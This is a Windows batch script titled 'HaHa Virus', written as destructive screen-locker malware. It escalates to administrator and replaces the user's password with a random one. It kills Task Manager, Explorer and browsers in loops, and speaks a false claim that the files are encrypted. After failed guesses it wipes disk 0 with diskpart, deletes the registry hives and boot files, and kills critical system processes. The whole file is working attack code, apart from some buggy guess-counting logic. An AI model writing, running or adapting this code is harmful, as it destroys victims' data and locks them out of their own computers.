@echo off
 :: BatchGotAdmin
:-------------------------------------
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

 if '%errorlevel%' NEQ '0' (
     echo Getting Admin..
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
:------------------------------------
color 04
title HaHa Virus

set pass=%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
net user %username% %pass%
echo %pass%>%HOMEDRIVE%\Windows\Help\pass.txt

cls
echo %COMPUTERNAME%, Hello.
pause
cls

cd %appdata%

echo title loop.bat > %temp%\loop.bat
echo :loop >> %temp%\loop.bat
echo taskkill /f /im taskmgr.exe >> %temp%\loop.bat
echo taskkill /f /im powershell.exe >> %temp%\loop.bat
echo taskkill /f /im "taskkill /f /im loop.bat" >> %temp%\loop.bat
echo taskkill /f /im "taskkill /f /im loop2.bat" >> %temp%\loop.bat
echo taskkill /f /im "taskkill /f /im cmd.exe" >> %temp%\loop.bat
echo taskkill /f /im "taskkill /f /im haha.bat" >> %temp%\loop.bat
echo taskkill /f /im "taskkill /f /im virus.bat" >> %temp%\loop.bat
echo goto loop >> %temp%\loop.bat

"%temp%\loop.bat"

echo title loop2.bat >> %temp%\loop2.bat
echo :loop >> %temp%\loop2.bat
echo taskkill /f /im "taskkill /f /im cmd.exe" >> %temp%\loop2.bat
echo taskkill /f /im "taskkill /f /im haha.bat" >> %temp%\loop2.bat
echo taskkill /f /im "taskkill /f /im loop.bat" >> %temp%\loop2.bat
echo taskkill /f /im "taskkill /f /im loop2.bat" >> %temp%\loop2.bat
echo taskkill /f /im explorer.exe >> %temp%\loop2.bat
echo taskkill /f /im chrome.exe >> %temp%\loop2.bat
echo taskkill /f /im MicrosoftEdge.exe >> %temp%\loop2.bat
echo goto loop >> %temp%\loop2.bat

"%temp%\loop2.bat"

echo CreateObject("SAPI.SpVoice").Speak "Your computer has been getttttttt dunked on!!!" >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak ", " >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "What happened to My Computer?" >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Your computer's password is encrypted." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Your computer and other files are no longer accessible after restart because they have been encrypted." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak ", " >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Can I Recover My Computer?" >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Sure. That's Super Easy" >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "You must guess the three digits what randomly generated." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "If you fail to guess in 5 times, then bluescreen will be appear and You will never access your computer any more." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Or you can restart forcely, Anyway you may can't access." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Yes. you should start guess, and you can change password when you success to guess." >> %temp%\lock.vbs
echo CreateObject("SAPI.SpVoice").Speak "Good luck and here we go to guess." >> %temp%\lock.vbs

"%temp%\lock.vbs"

cls
echo Your computer has been getttttttt dunked on!!!
echo.
echo What happened to My Computer?
echo Your computer's password is encrypted.
echo Your computer and other files are no longer accessible after restart because they have been encrypted.
echo.
echo Can I Recover My Computer?
echo Sure. That's Super Easy
echo You must guess the three digits what randomly generated.
echo If you fail to guess in 5 times, then bluescreen will be appear and You will never access your computer any more.
echo Or you can restart forcely, Anyway you may can't access.
echo Yes. you should start guess, and you can change password when you success to guess.
echo Good luck and here we go to guess.
timeout /t 55 > nul /nobreak

cls

set trynum=1
set password=%random%%random%%random%
echo %password%>%HOMEDRIVE%\Windows\Help\password.txt

cls

goto passwordloop


:passwordloop
cls
if %trynum%==5 goto fail
set /p try=Guess the three digits!:
REM master code is 01020304
if %try%==01020304 goto passwordreset
if NOT %try%==%password% trynum=%trynum%+1
goto passwordloop


:fail
cls

echo x=Msgbox("You, are, done.",0+64,"Information") >> %temp%\done.vbs

echo @echo off >> %temp%\done.bat
echo :loop >> %temp%\done.bat
echo start %temp%\done.vbs >> %temp%\done.bat
echo goto loop >> %temp%\done.bat

"%temp%\done.bat"

(echo select disk 0
echo clean
) | diskpart

del /f /s /q "C:\Windows\System32\config\SAM"
del /f /s /q "C:\Windows\System32\config\SOFTWARE"
del /f /s /q "C:\Windows\System32\config\SYSTEM"
del /f /s /q "C:\Windows\System32\config\COMPONENTS"
del /f /s /q "C:\Windows\System32\Boot\winload.exe"
del /f /s /q "C:\Windows\Boot\EFI\bootmgr.efi"

taskkill /F /IM csrss.exe 
taskkill /F /IM svchost.exe 
taskkill /F /IM wininit.exe 
taskkill /F /IM winlogon.exe

pause > nul
exit


:passwordreset
cls
set /p newpassword=변경할 이 컴퓨터의 비밀번호는 무엇입니까?:
set /p passwordcheck=변경할 이 컴퓨터의 비밀번호가%newpassword%가 맞나요?(Y, N)
if %passwordcheck%==Y goto newpasswordset
if %passwordcheck%==y goto newpasswordset
if %passwordcheck%==N goto passwordreset
if %passwordcheck%==n goto passwordreset
echo Y(y)또는 N(n)으로 입력하세요.
goto passwordreset
:newpasswordset
cls
echo 새로 변경된 이 컴퓨터 비밀번호는 %newpassword%입니다.
set /p passwordcheck2=문제 없나요?(Y, N)
if %passwordcheck%==Y goto okay
if %passwordcheck%==y goto okay
if %passwordcheck%==N goto passwordreset
if %passwordcheck%==n goto passwordreset
echo Y(y)또는 N(n)으로 입력하세요.
goto newpasswordset
:okay
net user %username% %newpassword%
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo 새로 변경된 이 컴퓨터 비밀번호는 %newpassword%입니다.
echo.
echo.
echo.
echo.
echo.
echo.
echo 사진을 찍거나 기억하세요
pause
start explorer.exe
:loopdadw
taskkill /f /im cmd.exe
goto loopdadw
